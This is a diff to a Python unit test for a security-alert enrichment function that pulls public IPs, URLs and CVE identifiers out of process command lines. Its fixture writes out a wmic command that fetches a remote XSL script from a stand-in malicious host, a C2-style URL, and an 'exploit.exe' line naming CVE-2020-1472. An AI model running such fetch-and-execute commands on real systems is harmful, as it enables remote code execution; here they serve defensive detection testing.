@@ -144,11 +144,11 @@ def test_lookup_targets_finds_public_ip_url_and_cve_only():
     assert lookup_targets(alert) == []  # command line with no IP/URL/CVE
     e.network = NetworkInfo(src_ip="10.0.0.5", dst_ip="52.113.194.132", dst_port=443)
     e.process = ProcessInfo(
-        command_line="wmic /FORMAT:https://evil.example/x.xsl",
+        command_line="wmic /FORMAT:https://evil-cdn.net/x.xsl http://c2.example.com/a",
         parent=ProcessInfo(command_line="exploit.exe CVE-2020-1472 172.18.39.6"),
     )
     assert lookup_targets(alert) == [
         "52.113.194.132",
-        "https://evil.example/x.xsl",
+        "https://evil-cdn.net/x.xsl",  # the reserved test domain (RFC 2606) is not a target
         "CVE-2020-1472",
     ]
